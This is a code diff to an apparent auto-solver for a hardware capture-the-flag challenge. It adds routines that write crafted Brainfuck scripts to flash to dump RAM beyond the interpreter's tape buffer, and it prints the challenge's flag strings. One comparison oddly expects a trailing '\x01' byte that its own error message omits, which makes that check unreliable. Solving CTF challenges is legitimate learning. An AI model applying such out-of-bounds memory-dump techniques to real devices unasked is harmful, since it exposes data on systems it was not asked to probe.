@@ -6,6 +6,7 @@ to enjoy the challenge of the CTF on your own!
 """
 
 from __future__ import annotations
+from typing import List
 
 from ..command_registry import CommandContext, CommandRegistry
 from . import sword_of_secrets            as sos
@@ -147,6 +148,8 @@ STAGE4_BF_SCRIPT = bytes(
     b'>' *   0x1 + # 0x3e: goto the second byte of the instruction
     b'+' *   0x4   # 0x2b: 0xE7 --> 0xeb (+4)
 ) #     299 bytes ... well shy of 512 byte maximum script size
+
+STAGE4_BF_MAX_BYTES_PER_LINE = 0x10
 
 # ---------------------------------------------------------------------------
 # Auto-solve stages 1-4
@@ -315,7 +318,7 @@ async def ensure_bf_dump_prerequisites(ctx: CommandContext) -> None:
         await sos.erase_flash_4k(0x50000, ctx)
         ctx.print("Done!")
 
-async def parse_bf_dump_output_and_extract_bytes(lines: List[str]) -> bytearray:
+async def parse_bf_dump_output_and_extract_bytes(ctx: CommandContext, lines: List[str]) -> bytearray:
 
     # success output lines always look like:
     # lines[0]: MAGICLIB{No one can break this! 0x20000}
@@ -327,22 +330,39 @@ async def parse_bf_dump_output_and_extract_bytes(lines: List[str]) -> bytearray:
     # except that lines[3] may contain between 1..16 bytes of hex data before "FLAG",
     # and the hex data is anything that legally outputs from '%02x ' format string for a single byte.
     #
-    if len(lines) != 5:
-        raise ValueError(f"Unexpected number of lines in BF dump output: {len(lines)} (expected 5)")
-    if lines[0] != "MAGICLIB{No one can break this! 0x20000}":
-        raise ValueError(f"Unexpected line 0 in BF dump output: {lines[0]!r} (expected 'MAGICLIB{{No one can break this! 0x20000}}')")
-    if lines[1] != "MAGICLIB{53Cr37 5745H: 0x30000}":
-        raise ValueError(f"Unexpected line 1 in BF dump output: {lines[1]!r} (expected 'MAGICLIB{{53Cr37 5745H: 0x30000}}')")
-    if lines[2] != "MAGICLIB{Passwd: 53R37 0x50000}":
-        raise ValueError(f"Unexpected line 2 in BF dump output: {lines[2]!r} (expected 'MAGICLIB{{Passwd: 53R37 0x50000}}')")
-    if lines[4] != "THE SECRET IS REVEALED!":
-        raise ValueError(f"Unexpected line 4 in BF dump output: {lines[4]!r} (expected 'THE SECRET IS REVEALED!')")
 
-    # Trim the non-hex postfix from line 3.
-    line3_postfix = "FLAG{The secrets of the swords are revealed!}"
-    if not lines[3].endswith(line3_postfix):
-        raise ValueError(f"Unexpected line 3 in BF dump output: {lines[3]!r} (expected to end with {line3_postfix!r})")
-    line3_hex_parts = lines[3][0:-len(line3_postfix)].trim().split(' ')
+    try:
+        if len(lines) != 5:
+            raise ValueError(f"Unexpected number of lines in BF dump output: {len(lines)} (expected 5)")
+        if lines[0] != "MAGICLIB{No one can break this! 0x20000}":
+            raise ValueError(f"Unexpected line 0 in BF dump output: {lines[0]!r} (expected 'MAGICLIB{{No one can break this! 0x20000}}')")
+        if lines[1] != "MAGICLIB{53Cr37 5745H: 0x30000}\x01":
+            raise ValueError(f"Unexpected line 1 in BF dump output: {lines[1]!r} (expected 'MAGICLIB{{53Cr37 5745H: 0x30000}}')")
+        if lines[2] != "MAGICLIB{Passwd: 53R37 0x50000}":
+            raise ValueError(f"Unexpected line 2 in BF dump output: {lines[2]!r} (expected 'MAGICLIB{{Passwd: 53R37 0x50000}}')")
+        if lines[4] != "THE SECRET IS REVEALED!":
+            raise ValueError(f"Unexpected line 4 in BF dump output: {lines[4]!r} (expected 'THE SECRET IS REVEALED!')")
+
+        # Trim the non-hex postfix from line 3.
+        line3_postfix = "FLAG{The secrets of the swords are revealed!}"
+        if not lines[3].endswith(line3_postfix):
+            raise ValueError(f"Unexpected line 3 in BF dump output: {lines[3]!r} (expected to end with {line3_postfix!r})")
+        line3_hex_parts = lines[3][0:-len(line3_postfix)].strip().split(' ')
+        if len(line3_hex_parts) > STAGE4_BF_MAX_BYTES_PER_LINE:
+            raise ValueError(f"Unexpected line 3 in BF dump output: {lines[3]!r} (expected at most {STAGE4_BF_MAX_BYTES_PER_LINE} bytes of hex data, but got {len(line3_hex_parts)})")
+
+        result = bytearray()
+        # convert from hex formatted as '%x ' to raw bytes
+        # could be any of: "0 ", "1 ", "2 ", ..., "fe ", "ff ", "00 ", "01 ", "02 ", ..., "0e ", "0f "
+        for part in line3_hex_parts:
+            result.append(int(part, base=16))
+
+        # ctx.print(f"Input OK, extracted {len(result)} bytes from {lines!r}")
+        return result
+    except Exception as e:
+        ctx.print_error(f"Input resulted in exception {e}\n")
+        ctx.print_error(f"Lines: {lines!r}\n")
+        raise
 
 async def read_all_accessible_bytes_prior_to_tape_via_bf_script(ctx: CommandContext) -> bytearray:
     # Returns 0xFE bytes that preceed the `tape` variable in RAM.
@@ -365,8 +385,8 @@ async def read_all_accessible_bytes_prior_to_tape_via_bf_script(ctx: CommandCont
         bytes_to_dump : int = 0
 
         while target_address < tape_start:
-            bytes_to_dump = min(0x10, tape_start - target_address)
-            instructions_to_reach_target = (target_address - tape_start)
+            bytes_to_dump = min(STAGE4_BF_MAX_BYTES_PER_LINE, tape_start - target_address)
+            instructions_to_reach_target = (tape_start - target_address)
             # each byte to be dumped takes two BF instructions, but can skip the final instruction
             # (which simply increments to the next memory location)
             bytes_to_dump = min(bytes_to_dump, (512 + 1 - instructions_to_reach_target) // 2)
@@ -381,31 +401,44 @@ async def read_all_accessible_bytes_prior_to_tape_via_bf_script(ctx: CommandCont
             await sos.write_flash(0x50000, bf_script, ctx)
             lines = await sos.util_send_command("SOLVE", ctx)
 
-            # TODO: parse the lines of output and append to bytearray result
-            for i, l in enumerate(lines):
-                ctx.print(f"Line {i:02d}: {l}")
-            ctx.print("")
-
+            parsed = await parse_bf_dump_output_and_extract_bytes(ctx, lines)
+            results.extend(parsed)
             target_address += bytes_to_dump
-
-
-    # Not yet implemented due to requirement of:
-    # * [ ] Function to parse the output of `SOLVE` to extract the BF-dumped data
-    raise NotImplementedError("This function is not implemented yet.")
+    return results
 
 async def read_all_accessible_bytes_following_tape_via_bf_script(ctx: CommandContext) -> bytearray:
-    await ensure_bf_dump_prerequisites(ctx)
-    # Returns 0xFF bytes that follow the `tape` variable in RAM.
-    #
-    # Although the BF script can be up to 0x200 bytes, the `tape` variable is 0x100 bytes,
-    # so the first 0x100 bytes of the BF script must advance past `tape` (b'>' * 0x100).
-    # This leaves 0x100 bytes of BF script, of which at least one (last) byte must be b'.'
-    # to dump the data at that final location, leaving a maximum of 0xFF bytes that can
-    # be read following the `tape` variable.
 
-    # Not yet implemented due to requirement of:
-    # * [ ] Function to parse the output of `SOLVE` to extract the BF-dumped data
-    raise NotImplementedError("This function is not implemented yet.")
+    tape_start : int = 0x200000F4
+    dump_start : int = 0x200000F4 # just start at tape....
+    results = bytearray()
+
+    with ctx.shell.suppress_serial_output():
+
+        target_address = dump_start
+        bytes_to_dump : int = 1
+
+        while bytes_to_dump > 0:
+            instructions_to_reach_target = target_address - tape_start
+            remaining_instructions = 512 - instructions_to_reach_target
+            bytes_to_dump = min(STAGE4_BF_MAX_BYTES_PER_LINE, (remaining_instructions+1) // 2)
+
+            bf_script : bytes = bytes(
+                b'>' * instructions_to_reach_target + # skip from data[0] to target address
+                b'.>' * (bytes_to_dump - 1)         + # dump the byte and skip to the next byte
+                b'.'                                  # dumps the final byte
+            )
+
+            await sos.erase_flash_4k(0x50000, ctx)
+            await sos.write_flash(0x50000, bf_script, ctx)
+            lines = await sos.util_send_command("SOLVE", ctx)
+
+            parsed = await parse_bf_dump_output_and_extract_bytes(ctx, lines)
+            results.extend(parsed)
+            target_address += bytes_to_dump
+
+    return results
+
+
 
 # ---------------------------------------------------------------------------
 # Commands registered with serial console
@@ -457,15 +490,30 @@ async def cmd_sos4_bf_dump(args: str, ctx: CommandContext) -> None:
     else:
         raise ValueError(f"Unexpected argument: `{args.strip()}` (expected `before`, `after`, or `both`)")
 
-    with ctx.shell.suppress_serial_output():
-        if dumpBeforeTape:
-            data_before_tape = await read_all_accessible_bytes_prior_to_tape_via_bf_script(ctx)
-            ctx.print("Data before `tape`:")
-            await sos.util_hex_dump(ctx, data_before_tape, base_address=0x20000000)
-        if dumpAfterTape:
-            data_after_tape = await read_all_accessible_bytes_following_tape_via_bf_script(ctx)
-            ctx.print("Data after `tape`:")
-            await sos.util_hex_dump(ctx, data_after_tape,  base_address=0x200001F4)
+    try:
+        with ctx.shell.suppress_serial_output():
+            data_after_tape : bytes = b''
+            data_before_tape : bytes = b''
+            start_address : int = 0
+            header : str = "undefined"
+            if dumpBeforeTape:
+                data_before_tape = await read_all_accessible_bytes_prior_to_tape_via_bf_script(ctx)
+                start_address = 0x20000000
+                header = "Data before `tape`:"
+            if dumpAfterTape:
+                data_after_tape = await read_all_accessible_bytes_following_tape_via_bf_script(ctx)
+                start_address = 0x200000f4
+                header = "Data after `tape`:"
+            if dumpBeforeTape and dumpAfterTape:
+                header = "All data around `tape`:"
+                start_address = 0x20000000
+
+            data = bytearray(data_before_tape + data_after_tape)
+            ctx.print(header)
+            await sos.util_hex_dump(ctx, data, base_address=start_address)
+    except Exception as e:
+        ctx.print_error(f"Error during BF dump: {e}")
+        raise
 
 async def cmd_full_solution(args: str, ctx: CommandContext) -> None:
     if args.strip() != "":
@@ -505,8 +553,6 @@ async def cmd_full_solution(args: str, ctx: CommandContext) -> None:
             for line in l:
                 ctx.print(line)
             ctx.print("Done!")
-
-
 
 # ---------------------------------------------------------------------------
 # FIN
